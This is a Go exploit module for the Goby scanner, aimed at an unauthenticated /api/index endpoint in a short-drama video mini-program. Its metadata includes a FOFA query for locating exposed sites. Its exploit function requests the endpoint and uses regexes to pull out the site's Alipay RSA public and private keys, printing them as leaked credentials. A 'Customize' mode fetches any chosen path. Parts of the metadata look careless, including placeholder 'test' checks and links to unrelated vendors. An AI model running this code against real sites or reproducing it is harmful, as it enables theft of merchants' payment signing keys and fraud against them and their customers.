package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Short drama film and television applet front desk /api/Index.php Unauthorized Access Vulnerability",
    "Description": "<p>The latest new version of the 2024 small theater short drama film and television applet source code + hot project, short drama APP applet source code hot project, short drama app applet H5 multi-terminal program is connected to Yifuzhi. In the index method of the /api/controller/Index.php controller, there is obviously where to query the website information and the fields in the User table, and enumerate all users, and because $noNeedLogin = ['*'] causes all interfaces to have no permission verification.</p>",
    "Product": "Short drama film and television applet front desk",
    "Homepage": "https://www.xiaomaw.cn/3188.html",
    "DisclosureDate": "2024-09-13",
    "PostTime": "2024-10-17",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"/VwmRIfEYDH.php\" && body=\"navbar-brand page-scroll\"",
    "GobyQuery": "body=\"/VwmRIfEYDH.php\" && body=\"navbar-brand page-scroll\"",
    "Level": "1",
    "Impact": "<p>there is obviously where to query the website information and the fields in the User table, and enumerate all users, and because $noNeedLogin = ['*'] causes all interfaces to have no permission verification.</p>",
    "Recommendation": "<p><a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>1.Pay attention to official patch release information, apply the patch or upgrade to the latest version:<a href=\"https://www.xiaomaw.cn/3188\">https://www.xiaomaw.cn/3188</a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/3WYJzQnjl8hP7oXVZUEQuA"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "rsaKey",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "短剧影视小程序前台 /api/Index.php 未授权访问漏洞",
            "Product": "短剧影视小程序",
            "Description": "<p>2024年最新新版小剧场短剧影视小程序源码+风口项目 ，短剧APP 小程序源码 风口项目 ，短剧app 小程序 &nbsp;H5 &nbsp;多端程序 对接了易支付，在 /api/controller/Index.php 控制器的index方法中，很明显地存在 where 查询网站信息及User表中的字段，并且将所有用户枚举出来，且因为 $noNeedLogin = ['*'] 导致所有接口都无权限验证.<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本:<a href=\"https://www.xiaomaw.cn/\" target=\"_blank\">https://www.xiaomaw.cn/</a><a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>在 /api/controller/Index.php 控制器的index方法中，很明显地存在 where 查询网站信息及User表中的字段，并且将所有用户枚举出来，且因为 $noNeedLogin = ['*'] 导致所有接口都无权限验证.<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Short drama film and television applet front desk /api/Index.php Unauthorized Access Vulnerability",
            "Product": "Short drama film and television applet front desk",
            "Description": "<p>The latest new version of the 2024 small theater short drama film and television applet source code + hot project, short drama APP applet source code hot project, short drama app applet H5 multi-terminal program is connected to Yifuzhi. In the index method of the /api/controller/Index.php controller, there is obviously where to query the website information and the fields in the User table, and enumerate all users, and because $noNeedLogin = ['*'] causes all interfaces to have no permission verification.<br></p>",
            "Recommendation": "<p><a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>1.Pay attention to official patch release information, apply the patch or upgrade to the latest version:<a href=\"https://www.xiaomaw.cn/3188\">https://www.xiaomaw.cn/3188</a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>there is obviously where to query the website information and the fields in the User table, and enumerate all users, and because $noNeedLogin = ['*'] causes all interfaces to have no permission verification.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/api/index"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/api/index": "rsaPrivateKey",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"rsaKey": {"/api/index", "rsaPrivateKey"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			//匹配公钥
			regular := `"alipayrsaPublicKey":"([^"]+)`
			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			output1, err := makeRegular(resp, regular)
			//匹配私钥
			regular2 := `"rsaPrivateKey":"([^"]+)`
			makeRegular2 := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			output2, err := makeRegular2(resp, regular2)

			expResult.Success = true
			expResult.Output = "泄露支付宝公钥和私钥\n" + "rsaPublicKey: " + output1 + "\n\nrsaPrivateKey: " + output2

			return expResult
		},
	))
}
